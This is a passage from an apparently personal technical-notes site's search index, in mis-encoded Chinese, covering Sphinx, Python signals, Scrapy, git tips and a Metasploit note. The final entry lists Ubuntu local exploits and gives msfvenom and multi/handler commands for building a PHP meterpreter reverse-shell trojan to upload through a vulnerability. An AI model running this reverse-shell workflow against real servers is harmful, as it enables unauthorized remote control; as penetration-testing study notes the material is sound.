ä½¿ç”¨ html_theme = 'sphinx_rtd_theme' å®‰è£… pip install sphinx_rtd_theme æŠ¥é”™ Could not import extension hoverxref.extension , å®‰è£…: pip install sphinx-hoverxref Could not import extension notfound.extension : pip install sphinx-notfound-page","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html"},{"title":"signal","text":"å®˜ç½‘æ–‡æ¡£:: signal éƒ¨åˆ†å‚è€ƒ:: pythonè¿›ç¨‹é—´é€šä¿¡--ä¿¡å·Signal pythonçš„ä¿¡å·å¤„ç†æ¨¡å— ä¿¡å·æ˜¯ Unix ç³»ç»Ÿä¸­å¸¸è§çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ï¼ˆIPCï¼‰, ä¹Ÿå«è½¯ä¸­æ–­ä¿¡å· ä½œç”¨æ˜¯é€šçŸ¥è¿›ç¨‹å‘ç”Ÿäº†å¼‚æ­¥äº‹ä»¶ã€‚è¿›ç¨‹ä¹‹é—´å¯ä»¥è°ƒç”¨ç³»ç»Ÿæ¥ä¼ é€’ä¿¡å·, æœ¬èº«å†…æ ¸ä¹Ÿå¯ä»¥å‘é€ä¿¡å·ç»™è¿›ç¨‹, å‘Šè¯‰è¯¥è¿›ç¨‹å‘ç”Ÿäº†æŸä¸ªäº‹ä»¶. æ³¨è§£ æ³¨æ„ï¼Œä¿¡å·åªæ˜¯ç”¨æ¥é€šçŸ¥æŸè¿›ç¨‹å‘ç”Ÿäº†ä»€ä¹ˆäº‹ä»¶ï¼Œå¹¶ä¸ç»™è¯¥è¿›ç¨‹ä¼ é€’ä»»ä½•æ•°æ®ã€‚ Python ä¿¡å·å¤„ç†ç¨‹åºæ€»æ˜¯ä¼šåœ¨ä¸» Python ä¸»è§£é‡Šå™¨çš„ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œå³ä½¿ä¿¡å·æ˜¯åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸­æ¥æ”¶çš„ã€‚ è¿™æ„å‘³ç€ä¿¡å·ä¸èƒ½è¢«ç”¨ä½œçº¿ç¨‹é—´é€šä¿¡çš„æ‰‹æ®µã€‚ ä½ å¯ä»¥æ”¹ç”¨ threading æ¨¡å—ä¸­çš„åŒæ­¥åŸè¯­ã€‚ æ­¤å¤–ï¼Œåªæœ‰ä¸»è§£é‡Šå™¨çš„ä¸»çº¿ç¨‹æ‰è¢«å…è®¸è®¾ç½®æ–°çš„ä¿¡å·å¤„ç†ç¨‹åºã€‚ æ¥æ”¶ä¿¡å·çš„è¿›ç¨‹å¯¹ä¸åŒçš„ä¿¡å·æœ‰ä¸‰ç§å¤„ç†æ–¹æ³•: æŒ‡å®šå¤„ç†å‡½æ•° å¿½ç•¥ æ ¹æ®ç³»ç»Ÿé»˜è®¤å€¼å¤„ç†, å¤§éƒ¨åˆ†ä¿¡å·çš„é»˜è®¤å¤„ç†æ˜¯ç»ˆæ­¢è¿›ç¨‹ linuxç›¸å…³ä¿¡å·å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxç³»ç»Ÿä¿¡å· signalå‡½æ•° è‡ªå®šä¹‰handler ç”¨äºåœ¨è¿›ç¨‹æ•æ‰åˆ°å…¶ä»–è¿›ç¨‹å‘é€çš„ä¿¡å·æ—¶è°ƒç”¨çš„å‡½æ•°. å½“æ­¤å‡½æ•°è¿”å›æ—¶, è¿›ç¨‹ç»§ç»­æŒ‰åŸæ¥çš„é€»è¾‘é¡ºåºæ‰§è¡Œã€‚ æ­¤å‡½æ•°åœ¨å®šä¹‰æ—¶pythonæ™®é€šå‡½æ•°çš„å®šä¹‰æ²¡æœ‰åŒºåˆ«ã€‚ å‡½æ•°åä¸ä¸€å®šæ˜¯handler, ä½†ä½œä¸ºä½œä¸ºå‚æ•°ä¼ å…¥signal()æ–¹æ³•çš„å‚æ•°åä¸€å®šæ˜¯ä¸å®šä¹‰handlerå‡½æ•°çš„å‡½æ•°ç›¸åŒ: def handler(signum,frame): do somethingâ€¦ sig: æ¥æ”¶åˆ°çš„ä¿¡å·ç¼–å·, signalæ¨¡å—å†…éƒ¨å®šä¹‰äº†ä¸€äº›å¸¸ç”¨çš„å†…æ ¸ä¿¡å·, å¹¶ä¸ºå®ƒä»¬è¿›è¡Œäº†ç¼–å·ã€‚ æ³¨æ„: windowsæ“ä½œç³»ç»Ÿæ²¡æœ‰SIGUSR1å’ŒSIGUSR2è¿™ä¸¤ä¸ªå‹å·ç±»å‹, linuxæ“ä½œç³»ç»Ÿæ‰æœ‰ frame: ä¿¡å·ç»“æ„å¯¹è±¡(å¯ä»¥é€šè¿‡ç»“æ„å¯¹è±¡æŸ¥çœ‹ä¿¡å·ä¿¡æ¯,åŸºæœ¬ä¸ç”¨) signalå‡½æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªå¼‚æ­¥çš„å›è°ƒå‡½æ•°, åªè¦æ‰§è¡Œäº†è¯¥å‡½æ•°, åˆ™è¿›ç¨‹ä»»æ„æ—¶å€™æ¥æ”¶åˆ°ç›¸åº”ä¿¡å·éƒ½ä¼šå¤„ç†ã€‚ è¿™é‡Œçš„å¼‚æ­¥å°±æ˜¯ä¸Šæ–‡æåˆ°çš„å¼‚æ­¥æœºåˆ¶, æ˜¯è®¡ç®—æœºå†…æ ¸ç¨‹åºä¸æœ¬è¿›ç¨‹é—´åŒæ—¶è¿è¡Œ, äº’ç›¸ä¸å¹²æ‰°çš„ä¸€ç§æœºåˆ¶, å¯¹äºè¿›ç¨‹çš„æ­£å¸¸æ‰§è¡Œæœ‰ç€å…³é”®çš„ä½œç”¨ã€‚ è¿™ç§å¼‚æ­¥æœºåˆ¶åœ¨ä»»ä½•åç«¯ç¼–ç¨‹è¯­è¨€ä¸­éƒ½æ˜¯å­˜åœ¨çš„, åªä¸è¿‡å®ç°çš„æ–¹å¼å’Œç»†èŠ‚ä¸ä¸€æ ·è€Œå·²ã€‚ alarm pause getsignal ä¿¡å·ä¸¾ä¾‹ windowsæ“ä½œç³»ç»Ÿä¸‹, SIGNALINTç¼–å·ä¸º2: >>>signal.SIGINT <Signals.SIGINT: 2> SIGBREAKç¼–å·ä¸º21: >>>signal.SIGBREAK <Signals.SIGBREAK: 21> å¸¸ç”¨ä¿¡å·ç±»å‹è§£æ: SIGHUP æ–­å¼€è¿æ¥ SIGINT ctrl-C SIGUIT ctrl-\\ SIGTSTP ctrl-z SIGKILL ç»ˆæ­¢è¿›ç¨‹ä¸”ä¸èƒ½è¢«å¤„ç† SIGSTOP æš‚åœè¿›ç¨‹ä¸”ä¸èƒ½è¢«å¤„ç† SIGALRM æ—¶é’Ÿè¿›ç¨‹ SIGCHLD å­è¿›ç¨‹çŠ¶æ€æ”¹å˜å‘é€ç»™çˆ¶è¿›ç¨‹ä¿¡æ¯å·(ä½†ä¸€èˆ¬çˆ¶è¿›ç¨‹ä¸ä¼šå¤„ç†) linuxç³»ç»Ÿä¿¡å·å¯å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxç³»ç»Ÿä¿¡å· æŠ€å·§ åœ¨ç³»ç»Ÿä¸­, SIGKILL å’Œ SIGSTOP ä¸¤ç§ä¿¡å·, è¿›ç¨‹æ˜¯æ— æ³•æ•è·çš„. æ‰€ä»¥å¯¹äºéœ€è¦äººä¸ºæ€æ­»çš„è¿›ç¨‹, å¯ä½¿ç”¨SIGTERMä¿¡å·ï¼ŒSIGTERMè¡¨ç¤ºç»ˆæ­¢ä¿¡å·ï¼Œæ˜¯killå‘½ä»¤ä¼ é€çš„ç³»ç»Ÿé»˜è®¤ä¿¡å·ï¼Œ å®ƒä¸SIGKIILçš„åŒºåˆ«æ˜¯ï¼ŒSIGTERMæ›´ä¸ºå‹å¥½ï¼Œè¿›ç¨‹å¯ä»¥æ•æ‰SIGTERMä¿¡å·ï¼Œè¿›è€Œæ ¹æ®éœ€è¦æ¥åšä¸€äº›æ¸…ç†å·¥ä½œ. æ‰‹åŠ¨è§¦å‘å°±æ˜¯: kill -15 pid è­¦å‘Š å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä½¿ç”¨ä¿¡å·ï¼Œåªæœ‰ main thread å¯ä»¥è®¾ç½® signal çš„ handler","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-signal.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-signal.html"},{"title":"æ¶æ„","text":"æ¶æ„å›¾(ç»¿è‰²çº¿ä»£è¡¨æ•°æ®æµ) æ¶æ„ Scrapy Engine(å¼•æ“) è´Ÿè´£Spiderã€ItemPipelineã€Downloaderã€Schedulerä¸­é—´çš„é€šè®¯ï¼Œä¿¡å·ã€æ•°æ®ä¼ é€’ç­‰ã€‚ Scheduler(è°ƒåº¦å™¨) å®ƒè´Ÿè´£æ¥å—å¼•æ“å‘é€è¿‡æ¥çš„Requestè¯·æ±‚ï¼Œå¹¶æŒ‰ç…§ä¸€å®šçš„æ–¹å¼è¿›è¡Œæ•´ç†æ’åˆ—ï¼Œå…¥é˜Ÿï¼Œå½“å¼•æ“éœ€è¦æ—¶ï¼Œäº¤è¿˜ç»™å¼•æ“ã€‚ Downloaderï¼ˆä¸‹è½½å™¨ï¼‰ è´Ÿè´£ä¸‹è½½Scrapy Engine(å¼•æ“)å‘é€çš„æ‰€æœ‰Requestsè¯·æ±‚ï¼Œå¹¶å°†å…¶è·å–åˆ°çš„Responsesäº¤è¿˜ç»™Scrapy Engine(å¼•æ“)ï¼Œç”±å¼•æ“äº¤ç»™Spideræ¥å¤„ç†ï¼Œ Spiderï¼ˆçˆ¬è™«ï¼‰ å®ƒè´Ÿè´£å¤„ç†æ‰€æœ‰Responses,ä»ä¸­åˆ†ææå–æ•°æ®ï¼Œè·å–Itemå­—æ®µéœ€è¦çš„æ•°æ®ï¼Œå¹¶å°†éœ€è¦è·Ÿè¿›çš„URLæäº¤ç»™å¼•æ“ï¼Œå†æ¬¡è¿›å…¥Scheduler(è°ƒåº¦å™¨). Item Pipeline(ç®¡é“) å®ƒè´Ÿè´£å¤„ç†Spiderä¸­è·å–åˆ°çš„Itemï¼Œå¹¶è¿›è¡Œè¿›è¡ŒåæœŸå¤„ç†ï¼ˆè¯¦ç»†åˆ†æã€è¿‡æ»¤ã€å­˜å‚¨ç­‰ï¼‰çš„åœ°æ–¹ã€‚ Downloader Middlewaresï¼ˆä¸‹è½½ä¸­é—´ä»¶ï¼‰ ä½ å¯ä»¥å½“ä½œæ˜¯ä¸€ä¸ªå¯ä»¥è‡ªå®šä¹‰æ‰©å±•ä¸‹è½½åŠŸèƒ½çš„ç»„ä»¶ã€‚ Spider Middlewaresï¼ˆSpiderä¸­é—´ä»¶ï¼‰ ä½ å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå¯ä»¥è‡ªå®šæ‰©å±•å’Œæ“ä½œå¼•æ“å’ŒSpiderä¸­é—´é€šä¿¡çš„åŠŸèƒ½ç»„ä»¶ï¼ˆæ¯”å¦‚è¿›å…¥Spiderçš„Responses;å’Œä»Spiderå‡ºå»çš„Requestsï¼‰","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html"},{"title":"sphinx","text":"rstæ–‡æ¡£åº“ ä½¿ç”¨è§ /docs/æ–‡æ¡£/rstæ ‡è®°è¯­è¨€/index å®‰è£…: pip install sphinx","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx.html"},{"title":"ä¸€äº›é—®é¢˜/ç”¨æ³•","text":"å¼ºåˆ¶æäº¤ å¼ºåˆ¶æäº¤, å¦‚å°†æœ¬åœ°teståˆ†æ”¯å¼ºåˆ¶ï¼ˆ-fï¼‰æ¨é€åˆ°è¿œç¨‹ä¸»åˆ†æ”¯master æ–¹æ³•ä¸€: git push origin test:master -f æ–¹æ³•äºŒ: # å°†å½“å‰åˆ†æ”¯åˆ‡æ¢åˆ°ä¸»åˆ†æ”¯ git checkout master # å°†ä¸»åˆ†æ”¯é‡ç½®ä¸ºteståˆ†æ”¯ git reset --hard test # å°†é‡ç½®åçš„masteråˆ†æ”¯å¼ºåˆ¶æ¨é€åˆ°è¿œç¨‹ä»“åº“ git push origin master -f å¼ºåˆ¶æ›´æ–°æœ¬åœ° æ‹‰å–åˆ†æ”¯æ—¶å¼ºåˆ¶è¦†ç›–æœ¬åœ° æ–¹æ³•ä¸€: git pull -f origin $remote_branch:$local_branch æ–¹æ³•äºŒ: # æ‹‰åˆ°æœ¬åœ°åº“ git fetch --all # æœ¬åœ°åº“å¼ºåˆ¶é‡åˆ¶ git reset --hard $branch # å·¥ä½œåŒºæ›´æ–° git pull # åˆèµ·æ¥ä¸€è¡Œä»£ç  # git fetch --all && git reset --hard feature-axpi-dev && git pull æ›´æ–°æäº¤ä¿¡æ¯ é’ˆå¯¹æäº¤äººä»¥åŠæäº¤é‚®ä»¶çš„ä¿®æ”¹. æ‰§è¡Œä»¥ä¸‹ä»£ç ä¿®æ”¹ç›¸å…³ä¿¡æ¯: git config --global --edit æ‰§è¡Œä»¥ä¸‹ä»£ç å°†ä¿®æ”¹åçš„å†…å®¹åº”ç”¨åˆ°commit: git commit --amend --reset-author æ³¨è§£ ä¿®æ”¹åå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹: git config --list ä»“åº“åˆå§‹åŒ–è¯´æ˜ ä¸€èˆ¬æ¥è¯´æœ‰ä¸¤ç§å½¢å¼ ä»æœ¬åœ°å¼€å§‹ è¿›å…¥æœ¬åœ°é¡¹ç›®æ ¹ç›®å½• æ‰§è¡Œ git init åˆå§‹åŒ–ä»“åº“ è¿œç¨‹æ–°å»ºä»“åº“ è®¾ç½®è¿œç¨‹ä»“åº“åœ°å€ git remote add origin xxx , xxx è¡¨ç¤ºä»“åº“åœ°å€ add åæ¨é€: git push --set-upstream origin master ä»è¿œç¨‹å¼€å§‹ åœ¨è¿œç¨‹ä»“åº“å¦‚ gitee æ–°å»ºä»“åº“, å¯ä»¥åœ¨æ­¤å¤„é€‰æ‹©æ€§é…ç½®å¥½ä¸€äº›æ–‡ä»¶ åœ¨æœ¬åœ°ä»“åº“é€‰æ‹©å¥½æ‹‰å–çš„ç›®å½•, æ‰§è¡Œ git clone xxx æ°¸ä¹…åˆ é™¤æ–‡ä»¶ å‘½ä»¤: git filter-branch --force --index-filter 'git rm -rf --cached --ignore-unmatch tagInterface/test.txt' --prune-empty --tag-name-filter cat -- --all -f ilter-branch é‡å†™Gitä»“åº“ä¸­çš„æäº¤ -r f å¦‚æœæƒ³è¦åˆ é™¤çš„æ˜¯æ–‡ä»¶å¤¹ï¼Œå°†ä¼šå¼ºåˆ¶å¹¶è¿­ä»£æŸ¥æ‰¾æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å¹¶åˆ é™¤ã€‚ --index-filter æŒ‡å®šä¸€æ¡Bashå‘½ä»¤ï¼Œç„¶åGitä¼šæ£€å‡ºï¼ˆcheckoutï¼‰æ‰€æœ‰çš„æäº¤ï¼Œ æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œç„¶åé‡æ–°æäº¤ --all éœ€è¦é‡å†™æ‰€æœ‰åˆ†æ”¯ï¼ˆæˆ–å¼•ç”¨ï¼‰ å›æ”¶ç©ºé—´(å®é™…è¿™ä¸€æ­¥è²Œä¼¼å¯ä»¥ä¸ç”¨): rm -rf .git/refs/original/ git reflog expire --expire=now --all git gc --prune=now git gc --aggressive --prune=now æœ€åå¼ºåˆ¶push: git push -f --all å¿½ç•¥å·²åœ¨ç‰ˆæœ¬æ§åˆ¶çš„æ–‡ä»¶ å·²ç»å°†æŸä¸ªæ–‡ä»¶æäº¤åˆ°Gitä»“åº“ä¸­ï¼Œå¹¶ä¸”æƒ³è¦å¿½ç•¥å®ƒçš„ä¿®æ”¹ ä½¿ç”¨`git update-index`å‘½ä»¤å°†æ–‡ä»¶æ ‡è®°ä¸ºå·²å¿½ç•¥: git update-index --assume-unchanged <file> å¦‚æœéœ€è¦æŸ¥çœ‹å“ªäº›æ–‡ä»¶è¢«æ ‡è®°ä¸ºå·²å¿½ç•¥ï¼Œå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤: git ls-files -v | grep '&#94;h' å…¶ä¸­\"h\"è¡¨ç¤ºæ–‡ä»¶å·²è¢«æ ‡è®°ä¸º\"assume unchanged\"ã€‚ å¦‚æœè¦ æ¢å¤å¯¹è¯¥æ–‡ä»¶çš„è·Ÿè¸ª ï¼Œå¯ä»¥ä½¿ç”¨`git update-index`å‘½ä»¤å°†å…¶å–æ¶ˆæ ‡è®°: git update-index --no-assume-unchanged <file> é€šè¿‡ä»¥ä¸Šæ“ä½œï¼Œæ‚¨å°±å¯ä»¥å°†æŸä¸ªå·²æäº¤çš„æ–‡ä»¶æ ‡è®°ä¸ºå·²å¿½ç•¥ï¼Œä»è€Œåœ¨ä»¥åçš„æäº¤ä¸­å¿½ç•¥å®ƒçš„ä¿®æ”¹ã€‚ è¯·æ³¨æ„ï¼Œè¿™åªä¼šåœ¨æœ¬åœ°å¿½ç•¥æ–‡ä»¶çš„ä¿®æ”¹ï¼Œè€Œä¸æ˜¯ä»ç‰ˆæœ¬åº“ä¸­åˆ é™¤å®ƒä»¬ã€‚ å¦‚æœæ‚¨å¸Œæœ›å°†å·²æäº¤çš„æ–‡ä»¶å½»åº•åˆ é™¤ï¼Œè¯·ä½¿ç”¨`git rm`å‘½ä»¤ï¼ŒåŒæ—¶å°†è¯¥æ–‡ä»¶æ·»åŠ åˆ°`.gitignore`æ–‡ä»¶ä¸­ã€‚ è¯¦è§: /docs/ç‰ˆæœ¬æ§åˆ¶/git/command/update-index tagçš„æ‹‰å–ä¸åˆ‡æ¢ å¯èƒ½å› ä¸ºtagæ˜¯é™æ€çš„å§, æ‰€ä»¥å¦‚æœç›´æ¥: git pull origin tag 1.0.0 è¿™æ ·æ‹‰å–, è‹¥äºæœ¬åœ°tagæœ‰å†²çª, å³ä½¿æ˜¯æ­£å¸¸è¿­ä»£çš„ç‰ˆæœ¬, ä¹Ÿä¼šå‘ç”Ÿmergeå†²çª(pullé»˜è®¤è¡Œä¸º) æ•…, ä¸€èˆ¬è¿™æ ·æ‹‰å–: å…ˆè·å–åˆ°æœ¬åœ°ç‰ˆæœ¬åº“: git fetch origin tag 1.0.0 ä»æœ¬åœ°ç‰ˆæœ¬tagåˆ‡æ¢: git checkout tags/1.0.0 æ³¨è§£ æ‹‰å–æ—¶, ä¼šè¦†ç›–æœ¬åœ°çš„æ‰€æœ‰å†…å®¹, æ‰€ä»¥æ³¨æ„ä¿å­˜ å…¨å±€é€‰é¡¹ å³, --global æˆ–è€… -g , åªæ˜¯è¦æ³¨æ„, å½“ä½¿ç”¨ -g çŸ­é€‰é¡¹æ—¶å€™, éœ€è¦å°†å…¶æ”¾åœ¨æœ«å°¾. å­æ¨¡å—æŠ¥é”™ å¦‚æœä½¿ç”¨: git submodule update å‡ºç°æŠ¥é”™: fatal: no submodule mapping found in .gitmodules for path . ç¡®è®¤ .gitmodules æ–‡ä»¶çš„é…ç½®æ²¡é—®é¢˜çš„è¯, å¤šåŠæ˜¯å®‰è£…çš„gitç‰ˆæœ¬é—®é¢˜, æ¢ä¸ªæ–°ä¸€ç‚¹çš„ç‰ˆæœ¬ æˆ–è€…æ”¯æŒå¹³å°çš„ç‰ˆæœ¬å³å¯. æ¯”å¦‚æˆ‘å†…ç½‘æœºé‡ç½®åå®‰è£…çš„ git2.1 ä¸è¡Œ, æ¢äº†ä¸ª git for windows 2.3 å°±å¯ä»¥äº†. ç½‘ç»œä¸ç¨³å®šå¯èƒ½å¯¼è‡´çš„æŠ¥é”™ ä½¿ç”¨VPNé“¾æ¥githubæ—¶å€™, cloneçš„æ—¶å€™å¯èƒ½ä¼šå‘ç”Ÿ: error: RPC failed; curl 18 Transferred a partial file.00 KiB/s error: 2457 bytes of body are still expected fetch-pack: unexpected disconnect while reading sideband packet fatal: early EOF fatal: fetch-pack: invalid index-pack output å¤šåŠæ˜¯å› ä¸ºVPNä¸ç¨³å®š, ä¼ è¾“æ•°æ®çš„æ—¶å€™èŠ‚ç‚¹å˜äº†, å¯¼è‡´æ•°æ®ä¸ä¸€è‡´, å¯ä»¥é€‰æ‹©å–æ¶ˆ è‡ªåŠ¨é€‰æ‹© , æˆ–è€…æ›´æ¢å…¶å®ƒç¨³å®šçš„VPNè¯•è¯•. æ³¨è§£ æœ‰æ—¶å€™åŠæ—¶æ²¡æœ‰ä½¿ç”¨ è‡ªåŠ¨é€‰æ‹© , èŠ‚ç‚¹ä¹Ÿå¯èƒ½ä¼šä¸ç¨³å®š, å¤šåŠæ˜¯VPNæä¾›å•†é‚£è¾¹çš„ç­–ç•¥æœ‰é—®é¢˜... æˆ‘ç”¨çš„æ˜¯ clashX Pro å¹¶é…ç½®äº† å…¨å±€é…ç½® å‡ºç°äº†è¿™ä¸ªé—®é¢˜(æœ€å¼€å§‹æ˜¯æ²¡æœ‰çš„), ç„¶åæ˜¯è¿™é“¾è‡ªå·±æ‰‹æœºçƒ­ç‚¹, å¹¶å…³é—­ å…¨å±€é…ç½® ç„¶åå•ç‹¬è®¾ç½®git ä»£ç†(å‚è€ƒ /docs/ç‰ˆæœ¬æ§åˆ¶/git/command/config ): git config --global http.https://github.com.proxy http://127.0.0.1:60742 å•ç”¨æˆ·é…ç½®å¤šæŠŠid_rsa æ¯”å¦‚ç»™githubä¸“é—¨é…ç½®ä¸€ä¸ªå¯†é’¥ æŒ‰ç…§æ­£å¸¸æµç¨‹ç”Ÿæˆå¯†é’¥: $ ssh-keygen -t RSA -C \"yanquer@qq.com\" æ³¨æ„å‘½å, æˆ‘è¿™é‡Œå…¬ç§å¯†é’¥åˆ†åˆ«: id_rsa_github.pub id_rsa_github ç„¶åç¼–è¾‘ ~/.ssh/config : Host github.com HostName github.com User yanquer IdentityFile ~/.ssh/id_rsa_github å¦‚æœè¿˜è¦ç»™giteeé…ç½®ä¸€ä¸ª, å†æ–°å»ºä¸ª id_rsa_gitee çš„å¯†é’¥åå¢åŠ : Host gitee.com HostName gitee.com User yanquer IdentityFile ~/.ssh/id_rsa_gitee å®Œå…¨åˆ é™¤å­æ¨¡å— ä» [Git] å¦‚ä½•ä¼˜é›…çš„åˆ é™¤å­æ¨¡å—(submodule)æˆ–ä¿®æ”¹Submodule URL <https://www.jianshu.com/p/ed0cb6c75e25> çœ‹åˆ°çš„ ä¼˜é›…çš„åˆ é™¤å­æ¨¡å— # é€†åˆå§‹åŒ–æ¨¡å—ï¼Œå…¶ä¸­{MOD_NAME}ä¸ºæ¨¡å—ç›®å½•ï¼Œæ‰§è¡Œåå¯å‘ç°æ¨¡å—ç›®å½•è¢«æ¸…ç©º git submodule deinit { MOD_NAME } # åˆ é™¤.gitmodulesä¸­è®°å½•çš„æ¨¡å—ä¿¡æ¯ï¼ˆ--cachedé€‰é¡¹æ¸…é™¤.git/modulesä¸­çš„ç¼“å­˜ï¼‰ git rm --cached { MOD_NAME } # æäº¤æ›´æ”¹åˆ°ä»£ç åº“ï¼Œå¯è§‚å¯Ÿåˆ°'.gitmodules'å†…å®¹å‘ç”Ÿå˜æ›´ git commit -am \"Remove a submodule.\" ä¿®æ”¹æŸæ¨¡å—URL ä¿®æ”¹ .gitmodules æ–‡ä»¶ä¸­å¯¹åº”æ¨¡å—çš„ url å±æ€§; ä½¿ç”¨ git submodule sync å‘½ä»¤ï¼Œå°†æ–°çš„URLæ›´æ–°åˆ°æ–‡ä»¶ .git/config ï¼› thinker-g@localhost: ~/app$ git submodule sync Synchronizing submodule url for 'gitmods/thinker_g/Helpers' thinker-g@localhost: ~/app$ # è¿è¡Œåå¯è§‚å¯Ÿåˆ°'.git/config'ä¸­å¯¹åº”æ¨¡å—çš„urlå±æ€§è¢«æ›´æ–° thinker-g@localhost: ~/app$ git commit -am \"Update submodule url.\" # æäº¤å˜æ›´ å°†å·²åœ¨ç‰ˆæœ¬åº“çš„æ–‡ä»¶æ›´ä¸ºå­æ¨¡å— å…ˆå»ºç«‹å¥½å­æ¨¡å—ä»“åº“, å‡è®¾æœ‰ä¸€ä¸ª submodule_repo ç›®å½•éœ€è¦æ›´æ”¹ä¸ºå­æ¨¡å— å…ˆå°†æœ¬åœ°ä»“åº“åˆå§‹åŒ– cd submodule_repo git init git add . git commit -m \"first commit\" å†å°†è¿œç¨‹ä¸æœ¬åœ°åˆå¹¶(è¿™ä¸ªæ˜¯è¿œç¨‹æ˜¯åˆšå»ºç«‹çš„æƒ…å†µ, æœ€å¤šåŠ  License, README ç­‰ä¸æœ¬åœ°æ— å…³çš„æ–‡ä»¶) git remote add origin git@xxx.git git fetch origin # åŠ  --allow-unrelated-historie å…è®¸æ— å†å²çº¿äº¤ç‚¹åˆå¹¶ # è‹¥ä¸è¡Œåˆ™åˆ‡åˆ†æ”¯åˆ git merge --allow-unrelated-historie origin/master è¿”å›ä¸»ä»“åº“æ¸…é™¤ç‰ˆæœ¬åº“å†…å®¹ cd .. git rm -rf --cached submodule_repo git commit -m \"remove submodule_repo\" å°†å­æ¨¡å—åŠ åˆ° .gitmodules , æ²¡æœ‰å°±æ–°å»º: [submodule \"submodule_repo\"] path = submodule_repo url = git@xxx.git ç„¶åæ›´æ–°å­æ¨¡å— git submodule init git submodule sync ç„¶å git status å°±å¯ä»¥çœ‹åˆ°ä¿¡æ¯äº†, å†æäº¤å³å¯ git add . git commit -m \"add submodule_repo as submodule\"","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Some-problems,-usage.html","loc":"/yq-doc-source-docs-version-control-git-Some-problems,-usage.html"},{"title":"msfconsole","text":"äº¤äº’å¼æ¼æ´æœç´¢å·¥å…· ç¤ºä¾‹ â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$ msfconsole Call trans opt: received. 2 -19-98 13 :24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. ( ` . ,-, ` ` . , ; ' / `. ,' / . ' `. X /.' .- ; -- '' --.._ ` ` ( . ' / ` , ` ' Q ' , , `._ \\ ,.| ' ` -. ; _ ' : . ` ; ` ` --,.._; ' ` , ) . ' `._ , ' /_ ; , '' -, ; ' ``- ``-..__``--` https://metasploit.com =[ metasploit v6.2.26-dev ] + -- --=[ 2264 exploits - 1189 auxiliary - 404 post ] + -- --=[ 951 payloads - 45 encoders - 11 nops ] + -- --=[ 9 evasion ] Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services Metasploit Documentation: https://docs.metasploit.com/ msf6 > searchsploit ubuntu 16.04 [*] exec: searchsploit ubuntu 16.04 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - L | linux/local/40937.txt Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Priv | linux/local/40054.c Google Chrome (Fedora 25 / Ubuntu 16.04) - ' t | linux/local/40943.txt LightDM ( Ubuntu 16 .04/16.10 ) - 'Guest Account | linux/local/41923.txt Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14. | linux_x86-64/local/42275.c Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c Linux Kernel (Ubuntu 16.04) - Reference Count | linux/dos/39773.txt Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) | linux/local/45175.c Linux Kernel 4.4 (Ubuntu 16.04) - ' BPF ' Local | linux/local/40759.rb Linux Kernel 4.4 (Ubuntu 16.04) - ' snd_timer_ | linux/dos/46529.c Linux Kernel 4 .4.0 ( Ubuntu 14 .04/16.04 x86-64 | linux_x86-64/local/40871.c Linux Kernel 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - Ne | linux_x86-64/local/40049.c Linux Kernel 4 .4.0-21 < 4 .4.0-51 ( Ubuntu 14 .0 | windows_x86-64/local/47170.c Linux Kernel 4 .4.x ( Ubuntu 16 .04 ) - 'double-f | linux/local/39772.txt Linux Kernel 4.6.2 (Ubuntu 16.04.1) - ' IP6T_S | linux/local/40489.txt Linux Kernel 4 .8 ( Ubuntu 16 .04 ) - Leak sctp K | linux/dos/45919.c Linux Kernel < 4 .13.9 ( Ubuntu 16 .04 / Fedora | linux/local/45010.c Linux Kernel < 4 .4.0-116 ( Ubuntu 16 .04.4 ) - L | linux/local/44298.c Linux Kernel < 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - | linux_x86-64/local/44300.c Linux Kernel < 4 .4.0-83 / < 4 .8.0-58 ( Ubuntu | linux/local/43418.c Linux Kernel < 4 .4.0/ < 4 .8.0 ( Ubuntu 14 .04/1 | linux/local/47169.c ---------------------------------------------- --------------------------------- Shellcodes: No Results msf6 > # ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ msfvenom -p php/meterpreter/reverse_tcp lhost = 192 .168.142.132 lport = 7777 -o shell.php # å°†æœ¨é©¬æ–‡ä»¶é€šè¿‡æ¼æ´ä¸Šä¼ åˆ°æœåŠ¡å™¨, ç„¶åè§¦å‘è®¿é—® # æ‰“å¼€äº¤äº’å¼msfconsoleå·¥å…·åšå¥½ç›‘å¬ msfconsole use exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 192 .168.142.132 set lport 